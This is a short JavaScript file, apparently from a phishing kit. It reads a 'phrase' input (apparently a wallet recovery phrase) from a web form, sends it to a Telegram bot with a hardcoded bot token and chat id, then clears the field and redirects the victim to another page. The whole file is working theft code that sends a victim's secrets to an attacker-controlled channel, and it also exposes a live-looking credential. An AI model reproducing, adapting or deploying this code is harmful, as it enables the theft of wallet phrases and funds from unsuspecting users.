//bot token
var telegram_bot_id = "7195951260:AAHxdqm879HGiJOdcowJ8W2Fd3BtCMDUMW0";
//chat id
var chat_id = -1002079191829;
var phr;
var ready = function () {
    phr = document.getElementById("phr").value;
    message = "Phrase: " + phr;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);

        window.location.href = "admin.html";
    });
    document.getElementById("phr").value = "";
    return false;
};
